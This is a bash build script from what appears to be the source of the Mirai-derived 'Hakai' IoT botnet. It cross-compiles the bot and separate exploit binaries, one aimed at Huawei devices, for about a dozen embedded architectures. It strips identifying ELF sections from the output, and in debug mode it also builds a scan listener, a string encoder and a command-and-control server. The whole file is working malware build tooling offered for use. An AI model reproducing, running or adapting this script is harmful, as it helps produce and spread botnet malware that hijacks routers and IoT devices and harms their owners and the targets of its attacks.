#!/bin/bash
FLAGS="-DREKAI_TELNET -DMIRAI_SSH"
function compile_bot {
    "$1-gcc" $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}
function compile_exploits {
    "$1-gcc" -DREKAI_TELNET -static -o release/"$2" bot/*.c
}
if [ $# == 0 ]; then
    echo "Usage: $0 <debug | release>"
elif [ "$1" == "release" ]; then
    rm release/*
	compile_bot i586 hakai.x86 $FLAGS "-static"
    compile_bot mips hakai.mips $FLAGS "-static"
    compile_bot mipsel hakai.mpsl $FLAGS "-static"
    compile_bot armv4l hakai.arm4 $FLAGS 
    compile_bot armv5l hakai.arm $FLAGS 
    compile_bot armv6l hakai.arm6 $FLAGS 
	compile_bot armv7l hakai.arm7 $FLAGS 
    compile_bot powerpc hakai.ppc $FLAGS "-static"
    compile_bot sparc hakai.spc $FLAGS "-static"
    compile_bot m68k hakai.m68k $FLAGS "-static"
    compile_bot sh4 hakai.sh4 $FLAGS "-static"
	compile_exploits i586 hakai.x86_32 $FLAGS "-static"
	compile_exploits x86_64 hakai.x86_64 $FLAGS "-static"
	compile_exploits mips hakai.huawei "-static"
	compile_exploits armv4l ea4
	compile_exploits armv7l ea7
elif [ "$1" == "debug" ]; then
    mkdir debug
	mkdir release
	gcc -std=c99 tools/enc.c -g -o debug/enc
	go build -o scanListen tools/scanListen.go
    go build -o debug/cnc cnc/*.go
	gcc bot/*.c -DDEBUG -DSCAN_MAX $FLAGS -static -g -o debug/hakai.dbg
else
    echo "Unknown parameter $1: $0 <debug | release>"
fi
